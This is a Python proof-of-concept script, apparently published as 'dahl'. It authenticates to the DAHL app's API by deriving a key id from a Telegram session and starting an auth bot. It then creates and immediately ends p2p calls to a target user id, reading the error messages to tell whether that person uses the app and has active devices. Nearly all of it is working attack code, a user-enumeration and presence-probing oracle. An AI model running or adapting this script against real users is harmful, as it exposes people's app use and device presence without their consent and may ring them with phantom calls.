# https://nx.rldv1.dev/rldv1/dahl -> https://github.com/rldv1/dahl

import asyncio, hashlib, json, random, re, sys, uuid, httpx, logging
from pathlib import Path
from telethon import TelegramClient
from telethon.tl.functions.messages import StartBotRequest

API_ID = 0
API_HASH = ""
API = "https://api.telega.info/v1/"
HEADERS = {"User-Agent": "DAHL-Mobile-App", "X-Platform": "Android", "X-Version": "2.4.0"}
TOKENS = "tokens.json"

logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(message)s",
    level=logging.INFO,
    handlers=[logging.StreamHandler(sys.stdout)],
)
log = logging.getLogger("dahlpoc")

def _key_id(key):
    h = hashlib.sha1(key).digest()
    return hashlib.sha1(bytes(reversed(h[-8:]))).hexdigest()

def _load():
    try:
        return json.loads(Path(TOKENS).read_text())
    except Exception as e:
        return {}

def _save(d): Path(TOKENS).write_text(json.dumps(d))

async def dopoc(uid):
    logging.getLogger("telethon").setLevel(logging.DEBUG)
    logging.getLogger("httpx").setLevel(logging.DEBUG)
    logging.getLogger("httpcore").setLevel(logging.DEBUG)

    tg  = TelegramClient("poc", API_ID, API_HASH)
    http = httpx.AsyncClient(headers=HEADERS, timeout=10.0)

    await tg.start()
    me = await tg.get_me()

    saved = _load()
    authed = False

    # idk exactly how long this token is valid, but somewhere around 12-24 hrs
    if saved.get("refresh_token"):
        r = await http.post(API + "auth/token", json={"token": saved["refresh_token"]})
        if r.status_code == 200:
            d = r.json()
            http.headers["Authorization"] = f"Bearer {d['access_token']}"
            _save({"access_token": d["access_token"], "refresh_token": d.get("refresh_token", saved["refresh_token"])})
            authed = True

    if not authed:
        key_id = _key_id(tg.session.auth_key.key)
        bot = await tg.get_entity("dahl_auth_bot")
        await tg(StartBotRequest(bot=bot, peer=bot, start_param=key_id, random_id=random.randint(0, 2**63)))
        await asyncio.sleep(5)
        for kid in (key_id, key_id.upper()):
            r = await http.post(API + "auth", json={"auth_key_id": kid, "user_id": me.id})
            if r.status_code == 200:
                d = r.json()
                http.headers["Authorization"] = f"Bearer {d['access_token']}"
                _save({"access_token": d["access_token"], "refresh_token": d.get("refresh_token", "")})
                break

    body = {"chat_id": me.id, "recipient_id": uid, "conversation_id": str(uuid.uuid4()), "is_video": False}
    r = await http.post(API + "api/calls/create", params={"type": "p2p"}, json=body)
    msg = (r.json().get("message", "") if r.headers.get("content-type", "").startswith("application/json") else "")
    key = msg.lower().replace(" ", "_")

    status = 0
    call_id = None

    if r.status_code in (200, 201):
        status = 2
        call_id = (r.json().get("data") or {}).get("call_id")
        
    elif r.status_code == 409 and "active_call_already_exists" in key:
        m = re.search(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", msg)
        if m:
            await http.post(API + "api/calls/end", json={"call_id": m.group(0)})
            await asyncio.sleep(1)
        body["conversation_id"] = str(uuid.uuid4())
        
        r2 = await http.post(API + "api/calls/create", params={"type": "p2p"}, json=body)
        if r2.status_code in (200, 201):
            status = 2
            call_id = (r2.json().get("data") or {}).get("call_id")
        else:
            k2 = r2.json().get("message", "").lower().replace(" ", "_")
            status = 0 if k2 in ("recipient_not_found", "callee_app_version_too_old") else -1
            
    elif r.status_code == 409 and key == "recipient_has_no_active_devices":
        status = 1
        
    elif r.status_code in (422, 400) or key in ("recipient_not_found", "callee_app_version_too_old"):
        status = 0
        
    else:
        status = -1

    if call_id:
        await http.post(API + "api/calls/end", json={"call_id": call_id})

    await http.aclose()
    await tg.disconnect()

    if status == -1:
        return {"ok": False, "error": msg}
    return {"ok": True, "dahl_status": status}

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("poc.py user_id")
        sys.exit(1)
    if not API_ID or len(API_HASH) != 32: print("missing API_ID or API_HASH")

    print(json.dumps(asyncio.run(dopoc(int(sys.argv[1])))))
